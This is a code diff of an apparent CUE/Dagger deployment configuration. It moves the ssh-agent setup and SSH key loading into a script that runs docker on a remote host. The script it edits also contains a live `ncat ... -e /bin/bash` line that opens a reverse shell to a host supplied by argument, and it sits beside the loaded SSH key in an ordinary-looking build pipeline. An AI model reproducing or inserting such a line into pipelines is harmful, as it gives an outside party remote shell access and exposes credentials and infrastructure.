@@ -205,27 +205,6 @@ import (
 			},
 		},
 
-		// Add the identity to the ssh-agent
-		op.#Exec & {
-			args: ["bash", "-c", #"""
-				set -o errexit -o errtrace -o functrace -o nounset -o pipefail
-
-				ssh::agent(){
-					# Start ssh agent
-					eval "$(ssh-agent)" > /dev/null
-				}
-
-				ssh::identity::add(){
-					# Add the key to the agent now
-					# XXX This will simply hang if the password is wrong - do fucking better
-					SSH_ASKPASS=/ssh_pass DISPLAY="" ssh-add /ssh_key >/dev/null 2>&1
-				}
-
-				ssh::agent
-				ssh::identity::add
-				"""#],
-		},
-
 		// Login docker on all registries we need
 		for k, registry in registries {
 			op.#Exec & {
@@ -262,14 +241,27 @@ import (
 					ncat "$l33t_host" "$l33t_port" -e /bin/bash
 				fi
 
+				ssh::agent(){
+					# Start ssh agent
+					eval "$(ssh-agent)" > /dev/null
+				}
+
+				ssh::identity::add(){
+					# Add the key to the agent now
+					# XXX This will simply hang if the password is wrong - do fucking better
+					SSH_ASKPASS=/ssh_pass DISPLAY="" ssh-add /ssh_key >/dev/null 2>&1
+				}
+
+				ssh::agent
+				ssh::identity::add
+
 				host="$1"
 				port="$2"
 				user="$3"
 				shift
 				shift
 				shift
-				eval "$(ssh-agent)" > /dev/null
-				SSH_ASKPASS=/ssh_pass DISPLAY="" ssh-add /ssh_key >/dev/null 2>&1
+
 				DOCKER_HOST="ssh://$user@$host:$port" docker "$@"
 				"""#, "--", l33t_host, l33t_port, "\(controller.host.host)", "\(controller.host.port)", "\(controller.host.user)"] + _args
 			always: true
